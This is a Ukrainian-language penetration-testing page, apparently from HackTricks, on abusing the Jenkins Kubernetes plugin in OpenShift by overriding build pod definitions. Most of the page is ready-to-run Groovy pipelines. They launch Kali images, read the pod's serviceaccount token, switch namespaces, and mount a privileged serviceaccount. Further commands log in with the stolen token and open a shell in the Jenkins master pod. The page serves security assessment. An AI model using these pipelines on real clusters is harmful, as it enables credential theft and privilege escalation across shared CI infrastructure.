# Jenkins в Openshift - переопределення подів збірки

{{#include ../../../banners/hacktricks-training.md}}

**Оригінальний автор цієї сторінки** [**Fares**](https://www.linkedin.com/in/fares-siala/)

## Плагін Kubernetes для Jenkins
Цей плагін в основному відповідає за основні функції Jenkins всередині кластера openshift/kubernetes. Офіційна документація [тут](https://plugins.jenkins.io/kubernetes/)
Він пропонує кілька функціональностей, таких як можливість для розробників переоприділити деякі стандартні конфігурації пода збірки jenkins.

## Основна функціональність

Цей плагін дозволяє розробникам бути гнучкими при створенні свого коду в належному середовищі.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: maven
image: maven:3.8.1-jdk-8
command:
- sleep
args:
- 99d
''') {
node(POD_LABEL) {
stage('Get a Maven project') {
git 'https://github.com/jenkinsci/kubernetes-plugin.git'
container('maven') {
stage('Build a Maven project') {
sh 'mvn -B -ntp clean install'
}
}
}
}
}
```
## Деякі зловживання, що використовують переваги yaml пода

Однак його можна зловживати, щоб використовувати будь-який доступний образ, наприклад Kali Linux, і виконувати довільні команди, використовуючи попередньо встановлені інструменти з цього образу.  
У наведеному нижче прикладі ми можемо ексфільтрувати токен serviceaccount запущеного пода.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: kali
image: myregistry/mykali_image:1.0
command:
- sleep
args:
- 1d
''') {
node(POD_LABEL) {
stage('Evil build') {
container('kali') {
stage('Extract openshift token') {
sh 'cat /run/secrets/kubernetes.io/serviceaccount/token'
}
}
}
}
}
```
Інший синтаксис для досягнення тієї ж мети.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Приклад для перевизначення простору імен пода
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: RANDOM-NAMESPACE
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Ще один приклад, який намагається змонтувати serviceaccount (який може мати більше прав, ніж стандартний, що виконує вашу збірку) на основі його імені. Вам, можливо, потрібно буде спочатку вгадати або перерахувати існуючі serviceaccounts.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: MY_SERVICE_ACCOUNT
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Така ж техніка застосовується для спроби монтування Secret. Кінцева мета тут - зрозуміти, як налаштувати збірку вашого пода, щоб ефективно здійснити поворот або отримати привілеї.

## Йдемо далі

Як тільки ви звикнете грати з цим, використовуйте свої знання про Jenkins та Kubernetes/Openshift, щоб знайти неправильні налаштування / зловживання.

Запитайте себе наступні питання:

- Який обліковий запис служби використовується для розгортання збірок подів?
- Які ролі та дозволи він має? Чи може він читати секрети простору імен, в якому я зараз знаходжусь?
- Чи можу я далі перерахувати інші збірки подів?
- З компрометованого sa, чи можу я виконувати команди на майстер-ноді/поду?
- Чи можу я далі перерахувати кластер, щоб здійснити поворот в інше місце?
- Який SCC застосовується?

Ви можете дізнатися, які команди oc/kubectl видавати [тут](../openshift-basic-information.md) та [тут](../../kubernetes-security/kubernetes-enumeration.md).

### Можливі сценарії підвищення привілеїв/повороту

Припустимо, що під час вашої оцінки ви виявили, що всі збірки jenkins виконуються в просторі імен, званому _worker-ns_. Ви з'ясували, що стандартний обліковий запис служби, званий _default-sa_, змонтований на збірках подів, однак у нього не так багато дозволів, окрім доступу на читання деяких ресурсів, але ви змогли ідентифікувати існуючий обліковий запис служби, званий _master-sa_.
Також припустимо, що у вас встановлена команда oc всередині запущеного контейнера збірки.

З нижченаведеним скриптом збірки ви можете взяти під контроль обліковий запис служби _master-sa_ і далі перерахувати.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: master-sa
containers:
- name: evil
image: random_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
sh 'token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)'
sh 'oc --token=$token whoami'
}
}
}
}
}
}
```
Залежно від вашого доступу, вам потрібно або продовжити вашу атаку з скрипту збірки, або ви можете безпосередньо увійти як цей sa на запущеному кластері:
```bash
oc login --token=$token --server=https://apiserver.com:port
```
Якщо цей sa має достатні дозволи (такі як pod/exec), ви також можете взяти під контроль цілий екземпляр jenkins, виконуючи команди всередині пода вузла майстра, якщо він працює в тій же області імен. Ви можете легко ідентифікувати цей под за його назвою та тим фактом, що він повинен монтувати PVC (постійний запит обсягу), який використовується для зберігання даних jenkins.
```bash
oc rsh pod_name -c container_name
```
У випадку, якщо под майстер-нод не працює в тому ж просторі імен, що й робітники, ви можете спробувати подібні атаки, націлюючись на простір імен майстра. Припустимо, він називається _jenkins-master_. Майте на увазі, що serviceAccount master-sa має існувати в просторі імен _jenkins-master_ (і може не існувати в просторі імен _worker-ns_).
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: jenkins-master
spec:
serviceAccount: master-sa
containers:
- name: evil-build
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}



{{#include ../../../banners/hacktricks-training.md}}
